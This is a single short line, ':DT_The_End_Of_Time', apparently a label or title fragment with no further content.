:DT_The_End_Of_Time
